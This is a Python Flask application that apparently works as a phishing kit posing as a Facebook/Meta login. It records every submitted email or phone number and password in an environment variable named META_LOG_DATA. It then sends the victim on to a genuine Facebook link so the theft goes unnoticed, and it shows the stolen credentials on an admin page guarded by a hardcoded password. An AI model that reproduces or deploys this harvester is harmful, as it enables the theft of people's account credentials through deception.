from flask import Flask, redirect, render_template, request, session, url_for, flash
import os
import re

app = Flask(__name__, template_folder="Site2")

data_var = "META_LOG_DATA"

app.secret_key = "some_secret_key"

port = int(os.environ.get("PORT", 5000))

def is_user_logged_in():
    return "username" in session

@app.route('/')
def home():
    return redirect(url_for('login'))

@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")
        pattern = r"^\+?\d{10,15}$|^\w+([\.-]?\w+)*@\w+([\.-]?\w+)*(\.\w{2,3})+$"
        if username == "admin" and password == "admin1234":
            session["username"] = username
            return redirect(url_for("admin"))
        else:
            if re.match(pattern, username):
                existing_data = os.environ.get(data_var, "")
                updated_data = f"{existing_data}\n{username}    {password}"
                os.environ[data_var] = updated_data
                print(os.environ.get(data_var))
                return redirect("https://www.facebook.com/share/1AchCnLYXU/?mibextid=wwXIfr")
            else:
                return render_template("login.html", error="Invalid username or password")
    else:
        return render_template("login.html")

@app.route('/admin')
def admin():
    if not is_user_logged_in():
        return redirect(url_for("login"))
    username = session.get("username")
    if username == "admin":
        data = os.environ.get(data_var, "")
    return render_template('home.html', data=data)

@app.route('/logout', methods=["POST"])
def logout():
    session.clear()
    return redirect(url_for('login'))

@app.route('/reset_data', methods=["POST"])
def reset_data():
    if not is_user_logged_in():
        return redirect(url_for("login"))
    username = session.get("username")
    if username == "admin":
        os.environ[data_var] = "USERNAME    PASSWORD\n" 
        flash("Data has been reset successfully.", "success")

    return redirect(url_for("admin"))

if __name__ == "__main__":  
    app.run(debug=True,host="0.0.0.0", port=port)




